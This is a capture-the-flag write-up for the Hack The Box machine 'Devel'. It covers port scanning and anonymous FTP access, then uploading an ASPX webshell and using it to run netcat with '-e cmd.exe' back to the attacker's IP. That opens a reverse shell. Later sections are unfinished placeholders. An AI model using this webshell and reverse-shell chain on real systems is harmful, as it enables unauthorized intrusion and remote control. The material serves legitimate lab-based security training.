# Devel 

**Links:** [1](https://www.hackthebox.com/machines/Devel)  [2](https://app.hackthebox.com/machines/Devel)

**Machine ip:** 10.10.10.5

![devel](https://github.com/h4md153v63n/CTFs/assets/5091265/9ab7e4a6-088a-4d20-88e1-5bc25641cfa1)


## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.5 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.5 --open

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fd580f7a-f9d8-4301-9fd7-82b27bb870e8)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/346d5392-a21f-4dde-b88b-5d98570477a1)


## Enumeration
```
ftp 10.10.10.5

Name (10.10.10.5:kali): anonymous
Password:

dir
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5149c861-836c-4c01-adf3-c5e5c3ad24d8)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/239327b2-ccb6-453a-9645-357665efbd90)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8f62462c-3a38-4713-85c3-4d48866cbec0)


## Exploitation & Gaining Access 
Download, and transfer asp webshell using [cmd.aspx](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx).

```
put cmd.aspx

dir
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cf0496fc-5036-426f-9943-52b96ec96bd1)

Navigate to "http://10.10.10.5/cmd.aspx", and get a webshell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a37e66b5-b01c-4d6a-b2bb-bd8c4c0b464b)

```
# On the kali attack vm:
ls /usr/share/windows-binaries

smbserver.py tmp /usr/share/windows-binaries

nc -lnvp 4444

# On the webshell:
Program: \\10.10.14.24\tmp\nc.exe

Arguments: -e cmd.exe 10.10.14.24 4444

Run
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/78cf0d24-8148-458c-9b1d-bb9f20707968)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1f5378dd-6bf9-42f4-86ab-3d02c331d11b)


## Privilege Escalation



# References & Alternatives
+ https://vvmlist.github.io/#devel
+ x


## CVE Scripting
+ x


## Tools
+ **webshell / cmd.aspx:** https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
  + https://github.com/nikicat/web-malware-collection/blob/master/Backdoors/ASP/cmd.aspx


## Technical Knowledge
+ x


## Problems Solution
+ x


## For More
+ x
